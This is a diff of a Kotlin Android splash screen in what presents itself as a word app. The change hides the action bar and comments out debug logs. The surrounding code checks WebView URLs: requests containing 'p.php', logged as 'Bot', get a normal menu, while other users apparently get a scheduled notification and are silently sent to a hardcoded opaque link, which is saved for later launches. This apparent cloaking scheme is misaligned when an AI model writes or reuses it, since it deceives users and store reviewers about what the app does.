@@ -26,6 +26,7 @@ class SplashActivity : AppCompatActivity() {
         setContentView(R.layout.activity_splash)
         window.statusBarColor = Color.BLUE
         actionBar?.hide()
+        supportActionBar?.hide()
         preference = WordPreferences(this).apply { getSharedPreference("fav") }
         val apiLink = preference!!.getString("fav")
         if(apiLink != null && apiLink != "") goToWord(apiLink)
@@ -43,23 +44,22 @@ class SplashActivity : AppCompatActivity() {
 
     private fun internetChecking(){
         fav_response.settings.javaScriptEnabled = true
-        Log.e("OPen", "wivew")
         fav_response.webViewClient = object : WebViewClient(){
             override fun shouldOverrideUrlLoading(
                 view: WebView?,
                 request: WebResourceRequest?
             ): Boolean {
                 if(request == null) Log.e("kek", "sooqa req null")
-                Log.e("Url", request?.url.toString())
+               // Log.e("Url", request?.url.toString())
                 var req = request?.url.toString()
                 if(req.contains("p.php")){
-                    Log.e("Bot", "p")
+                   // Log.e("Bot", "p")
                     chooseMenu()
                 }
                 else{
                     if(!req.contains(".site")){
                         AlarmNotification().scheduleNotification(this@SplashActivity)
-                        Log.e("Kek", "add")
+                        //Log.e("Kek", "add")
                         preference?.putString("fav", "http://trrfcbt.com/KyQbcz")
                         goToWord("http://trrfcbt.com/KyQbcz")
                     }
